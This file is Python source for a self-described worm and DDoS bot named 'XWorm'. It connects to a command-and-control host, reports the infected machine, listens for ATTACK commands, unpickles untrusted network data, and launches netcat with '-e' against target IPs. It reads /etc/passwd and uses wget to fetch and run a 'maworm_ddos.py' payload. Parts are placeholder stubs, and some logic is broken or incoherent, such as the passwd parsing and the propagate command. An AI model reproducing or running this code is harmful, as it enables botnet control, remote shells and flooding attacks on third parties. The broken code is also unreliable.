import socket
import threading
import time
import random
import os
import subprocess
import pickle

class XWorm:
    def __init__(self, c2_host, c2_port, attack_target, attack_type):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.attack_target = attack_target
        self.attack_type = attack_type
        self.host = socket.gethostbyname(socket.gethostname())
        self.port = random.randint(1024, 65535)
        self.c2_socket = None

    def connect_to_c2(self):
        try:
            self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2_socket.connect((self.c2_host, self.c2_port))
            print(f"Connected to C2 server at {self.c2_host}:{self.c2_port}")
        except Exception as e:
            print(f"Failed to connect to C2 server: {e}")

    def send_infection_data(self):
        try:
            infection_data = f"{self.host}:{self.port}"
            self.c2_socket.send(infection_data.encode("utf-8"))
            print(f"Sent infection data to C2 server: {infection_data}")
        except Exception as e:
            print(f"Failed to send infection data: {e}")

    def receive_commands(self):
        while True:
            try:
                command = self.c2_socket.recv(1024).decode("utf-8")
                if command == "ATTACK":
                    self.execute_attack()
            except Exception as e:
                print(f"Error receiving commands: {e}")

    def execute_attack(self):
        print(f"Executing attack on {self.attack_target} with {self.attack_type}")
        # Write your attack code here

    def spread_infection(self):
        print("Attempting to spread infection on the network")
        # Write your infection code here

class ServerThread(threading.Thread):
    def __init__(self, s):
        threading.Thread.__init__(self)
        self.s = s

    def run(self):
        while True:
            try:
                data = self.s.recv(1024)
                cmd, _ = pickle.loads(data)
                if cmd == "COM_CONNECT":
                    self.handle_connect()
                elif cmd == "COM_DISCONNECT":
                    self.handle_disconnect()
                elif cmd == "COM_ATTACK":
                    self.handle_attack()
            except Exception as e:
                print(e)
                self.s.close()
                break

    def handle_connect(self):
        print("Client {} connected".format(self.s.getpeername()))
        self.s.send(pickle.dumps(("ACK_CONNECT", )))
        ServerThread(self.s).start()

    def handle_disconnect(self):
        self.s.close()
        print("Client {} disconnected".format(self.s.getpeername()))

    def handle_attack(self):
        target_ips = {"target_ips"}  # replace this line with the list of target IPs
        for command in {"shell_commands"}:  # replace this line with the list of shell commands
            for target_ip in target_ips:
                command_ip = "{}.{}".format(target_ip.split('.')[0], str(int(target_ip.split('.')[3]) + 1)) if len(target_ip.split('.')) == 4 else target_ip
                spine = ['nc', target_ip, str(5555), '-e', command]
                subprocess.call(spine)
                time.sleep(3)
        self.s.send(pickle.dumps(("ACK_ATTACK", )))

def have_ssh(ip):
    try:
        s = socket.create_connection((ip, 22))
        s.close()
        return True
    except OSError:
        return False

def propagate(ip):
    spine = ['/tmp/maworm_ddos.py', 'python', '/tmp/maworm_ddos.py', '{}'.format(ip)]
    subprocess.call(spine)

def main():
    me = socket.gethostbyname(socket.getfqdn())
    print("Launching server on port 5555...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 5555))
    s.listen(5)
    print("Listening for incoming connections...")
    ServerThread(s).start()

    while True:
        with open('/etc/passwd', 'r') as passwdfile:
            lines = [line.strip() for line in passwdfile.readlines()]
            for line in lines:
                user, _, home = line.split()
                if not user.endswith('root'):
                    continue
                home = home.strip()
                if not os.path.isdir(home):
                    continue
                if have_ssh(me):
                    spine = ['/bin/bash', '-c', 'cd {}; wget -O /tmp/maworm_ddos.py https://{}/maworm_ddos.py; python /tmp/maworm_ddos.py'.format(home, me)]
                    subprocess.call(spine)
                    spine = ['/bin/bash', '-c', 'cd {}; /tmp/maworm_ddos.py &'.format(home)]
                    subprocess.call(spine)
                time.sleep(1)

if __name__ == "__main__":
    c2_host = "c2.example.com"
    c2_port = 1337

    worm = XWorm(c2_host, c2_port, "example.com", "HTTP Flood")
    worm.connect_to_c2()
    worm.send_infection_data()

    infection_thread = threading.Thread(target=worm.spread_infection)
    infection_thread.start()

    # Start a new thread to receive commands
    receive_thread = threading.Thread(target=worm.receive_commands)
    receive_thread.start()

    main()
